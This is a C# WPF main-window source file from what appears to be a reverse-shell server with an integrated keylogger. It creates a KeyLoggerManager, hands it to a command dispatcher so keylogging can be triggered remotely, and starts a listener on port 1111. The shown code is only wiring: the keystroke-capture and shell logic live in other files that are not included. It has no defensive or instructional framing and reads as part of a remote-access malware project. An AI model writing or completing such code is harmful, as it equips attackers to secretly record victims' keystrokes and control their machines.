using Commands;
using KeyLogger;
using System.Threading.Tasks;
using System.Windows;

namespace ReverseShellServer
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        /// <summary>
        /// The keyLoggerManager must be instanciated from this thread
        /// </summary>
        public static KeyLoggerManager keyLoggerManager;


        public MainWindow()
        {
            InitializeComponent();

            // Give the KeyloggerManager instance to the KeyLogger ICommand
            keyLoggerManager = new KeyLoggerManager();
            CommandsManager.PassKeyloggerManagerInstance(keyLoggerManager);
            
            // Start the server manager in a new thread as a task
            var manager = new ServerManager();
            var mainTask = new Task(() => manager.Start("127.0.0.1", 1111, 3000));
            mainTask.Start();
        }


        /// <summary>
        /// When the application is exiting, stop the keylogger
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            keyLoggerManager.Stop();
        }
    }
}
